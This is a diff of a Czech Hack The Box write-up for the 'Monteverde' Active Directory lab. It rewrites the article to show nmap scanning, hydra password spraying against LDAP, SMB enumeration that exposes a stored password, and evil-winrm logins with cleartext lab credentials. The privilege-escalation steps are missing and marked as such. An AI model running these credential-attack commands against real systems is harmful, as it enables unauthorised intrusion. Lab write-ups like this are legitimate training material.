@@ -5,11 +5,19 @@ title: "Monteverde"
 date: 2020-12-17
 tags: windows linux kerberos ldap winrm active-directory
 ---
-[Monteverde](https://www.hackthebox.eu/home/machines/profile/223) je stroj z Hack The Box. V postupu se opírám hlavně o AD enumeraci, práci s účty a následnou eskalaci.
+
+## Úvod a kontext
+
+Monteverde je stroj z Hack The Box. Dochované podklady zachycují jen část postupu, proto níže ponechávám pouze technicky doložitelné kroky a chybějící části výslovně označuji k ověření.
+
+## Počáteční průzkum
 
 ### Vyhledání otevřených portů
-Nejdřív mapuji služby, které jsou dostupné zvenku.
-`ports=$(nmap -Pn -p- --min-rate=1000 -T4 $IP | grep ^[0-9] | cut -d "/" -f 1 | tr "\n" "," | sed s/,$//);nmap -Pn -p $ports -A -sC -sV -v $IP`
+
+Nejprve mapuji veřejně dostupné služby, protože právě z otevřených portů odvodím, které protokoly a aplikace má smysl zkoumat detailněji.
+```bash
+ports=$(nmap -Pn -p- --min-rate=1000 -T4 $IP | grep ^[0-9] | cut -d "/" -f 1 | tr "\n" "," | sed s/,$//);nmap -Pn -p $ports -A -sC -sV -v $IP
+```
 ```
 53,88,135,139,389,445,464,593,636,3268,3269,5985,9389,49667,49669,49670,49671,49702,49771
 PORT      STATE SERVICE       VERSION
@@ -52,41 +60,82 @@ Service Info: Host: MONTEVERDE; OS: Windows; CPE: cpe:/o:microsoft:windows
 ```
 
 ### Vyhledání otevřených portů (2)
-Nejdřív mapuji služby, které jsou dostupné zvenku.
-`nmap -Pn -p 53,88,135,139,389,445,464,593,636,3268,3269,5985,9389,49667,49669,49670,49671,49702,49771 -n -v -sV -Pn --script *vuln*,*enum* $IP`
+
+Nejprve mapuji veřejně dostupné služby, protože právě z otevřených portů odvodím, které protokoly a aplikace má smysl zkoumat detailněji.
+```bash
+nmap -Pn -p 53,88,135,139,389,445,464,593,636,3268,3269,5985,9389,49667,49669,49670,49671,49702,49771 -n -v -sV -Pn --script *vuln*,*enum* $IP
+```
+
+## Analýza zjištění
 
 ### Lámání hesel nebo hashů
-Pokud mám hash nebo šifrovaný soubor, slovníkový útok může odemknout další krok útoku.
-`hydra -L Monteverde-users.txt -P Monteverde-users.txt $IP ldap2 -I`
+
+Hash nebo zašifrovaný artefakt má smysl lámat jen tehdy, pokud může otevřít další službu, účet nebo vrstvu prostředí; právě to zde ověřuji.
+```bash
+hydra -L Monteverde-users.txt -P Monteverde-users.txt $IP ldap2 -I
+```
 ```
 => [389][ldap2] host: 10.10.10.172   login: SABatchJobs   password: __CENSORED__
 ```
 
+## Počáteční průzkum
+
 ### Enumerace SMB
-Kontroluji SMB sdílení a hledám data, která mohou obsahovat citlivé informace.
-`./enum4linux.pl -a -d -o -v -u SABatchJobs -p SABatchJobs $IP > Monteverde-enum4linux.txt`
+
+U SMB sdílení ověřuji, jaká data jsou dostupná bez dalších oprávnění a zda z nich lze získat účty, dokumenty nebo konfigurační tajemství.
+```bash
+./enum4linux.pl -a -d -o -v -u SABatchJobs -p SABatchJobs $IP > Monteverde-enum4linux.txt
+```
 ```
 => home$/mhope/azure.xml: 4n0therD4y@n0th3r$
 ```
 
+## Získání přístupu
+
 ### Přihlášení na cíl
-Po získání přihlašovacích údajů přecházím na stabilní shell na cílovém stroji.
-`./evil-winrm/evil-winrm.rb -i $IP -u mhope -p "4n0therD4y@n0th3r$"`
+
+Jakmile mám pověření nebo jednorázový shell, snažím se přejít na stabilní a reprodukovatelný přístup, aby bylo možné bezpečně pokračovat v interní enumeraci.
+```bash
+./evil-winrm/evil-winrm.rb -i $IP -u mhope -p "4n0therD4y@n0th3r$"
+```
 
 ### Získání user flagu
-Tímto potvrzuji úspěšný uživatelský přístup.
-`cat user.txt`
+
+User flag zde slouží hlavně jako potvrzení, že už mám běžný uživatelský kontext a mohu pokračovat v lokální analýze systému.
+```bash
+cat user.txt
+```
 ```
 __CENSORED__
 ```
 
 ### Přihlášení na cíl (2)
-Po získání přihlašovacích údajů přecházím na stabilní shell na cílovém stroji.
-`./evil-winrm/evil-winrm.rb -i $IP -u administrator -p "d0m@in4dminyeah!"`
+
+Jakmile mám pověření nebo jednorázový shell, snažím se přejít na stabilní a reprodukovatelný přístup, aby bylo možné bezpečně pokračovat v interní enumeraci.
+```bash
+./evil-winrm/evil-winrm.rb -i $IP -u administrator -p "d0m@in4dminyeah!"
+```
 ```
 gc root.txt
 __CENSORED__
 ```
 
+## Eskalace oprávnění
+
 ### Získání root flagu
-`TODO`
+
+Tento krok ukazuje, jak se nalezená slabina nebo chyba v delegaci oprávnění mění v privilegovaný přístup.
+
+[POZNÁMKA K OVĚŘENÍ: V dostupném podkladu chybí konkrétní kroky pro eskalaci oprávnění a získání root přístupu. Bez dalších artefaktů je nelze doplnit technicky přesně.]
+
+## Shrnutí klíčových poznatků
+
+- Dochované podklady zachycují jen část postupu, proto jsou místa bez opory ve zdrojovém textu označena ověřovací poznámkou místo domněnek.
+- Záměrně nedoplňuji neověřené detaily o exploitu, kredenciálech ani eskalaci; publikovatelná verze musí stát jen na dohledatelných krocích.
+- Chybějící mezikroky mezi enumerací, potvrzením přístupu a finální eskalací zůstávají explicitně otevřené k doplnění z ověřených podkladů.
+
+## Co si odnést do praxe
+
+- Pro publikovatelný HTB write-up je nutné uložit i mezikroky mezi enumerací, hypotézou a potvrzením přístupu; samotné placeholdery nestačí.
+- Pokud chybí výstupy nebo přesná argumentace, je lepší explicitně přiznat nejistotu než doplňovat neověřené technické detaily.
+- Stejné techniky mají smysl pouze v laboratorním nebo jinak autorizovaném testovacím prostředí.
